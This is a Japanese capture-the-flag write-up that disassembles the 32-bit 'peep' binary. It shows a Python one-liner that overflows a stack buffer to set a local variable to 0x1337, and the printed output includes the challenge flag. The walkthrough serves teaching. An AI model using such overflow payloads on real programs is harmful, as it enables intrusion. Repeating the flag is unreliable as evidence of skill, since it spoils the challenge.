# peep
初手で`file`コマンドを叩きます。

```bash=
$ file peep
peep: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=603e5405425a4d9120b032c02734622920b2e1bc, not stripped
```

32bitの実行ファイルであるので, とりあえず実行します。
```bash=
$ ./peep 
hoge
key is 0x0
```

入力を1回求められた後にkeyのアドレスらしきものが表示されます。

よくわからないので逆アセンブルします。これはradare2でもobjdumpでもokです。今回はobjdumpを使用します。

```bash=
$ objdump -d -M intel --no ./peep

./peep:     file format elf32-i386

~~~ 略 ~~~
08048476 <main>:
 8048476:	lea    ecx,[esp+0x4]
 804847a:	and    esp,0xfffffff0
 804847d:	push   DWORD PTR [ecx-0x4]
 8048480:	push   ebp
 8048481:	mov    ebp,esp
 8048483:	push   ebx
 8048484:	push   ecx
 8048485:	sub    esp,0x20
 8048488:	call   80483b0 <__x86.get_pc_thunk.bx>
 804848d:	add    ebx,0x1b73
 8048493:	mov    DWORD PTR [ebp-0xc],0x0
 804849a:	mov    eax,DWORD PTR [ebx-0x4]
 80484a0:	mov    eax,DWORD PTR [eax]
 80484a2:	sub    esp,0x4
 80484a5:	push   eax
 80484a6:	push   0x20
 80484a8:	lea    eax,[ebp-0x1c]
 80484ab:	push   eax
 80484ac:	call   8048330 <fgets@plt>
 80484b1:	add    esp,0x10
 80484b4:	sub    esp,0x8
 80484b7:	push   DWORD PTR [ebp-0xc]
 80484ba:	lea    eax,[ebx-0x1a80]
 80484c0:	push   eax
 80484c1:	call   8048320 <printf@plt>
 80484c6:	add    esp,0x10
 80484c9:	cmp    DWORD PTR [ebp-0xc],0x1337
 80484d0:	jne    80484eb <main+0x75>
 80484d2:	sub    esp,0x8
 80484d5:	lea    eax,[ebx+0x40]
 80484db:	push   eax
 80484dc:	lea    eax,[ebx-0x1a73]
 80484e2:	push   eax
 80484e3:	call   8048320 <printf@plt>
 80484e8:	add    esp,0x10
 80484eb:	mov    eax,0x0
 80484f0:	lea    esp,[ebp-0x8]
 80484f3:	pop    ecx
 80484f4:	pop    ebx
 80484f5:	pop    ebp
 80484f6:	lea    esp,[ecx-0x4]
 80484f9:	ret    
 80484fa:	xchg   ax,ax
 80484fc:	xchg   ax,ax
 80484fe:	xchg   ax,ax
~~~ 略 ~~~
```

コードを読んでみると, `0x80484d0`番地で`jne`(Jump Not Equal)命令が実行されているせいで, `0x80484e3`番地の`printf`が実行されていないことがわかります。

```bash=
$ python -c 'import sys;sys.stdout.buffer.write(b"A"*16 + b"\x37\x13\x00\x00")' | ./peep
key is 0x1337
flag is taskctf{ch3ck_7h3_l0c4710n_0f_v4r14bl3s!!}
Segmentation fault (core dumped)
```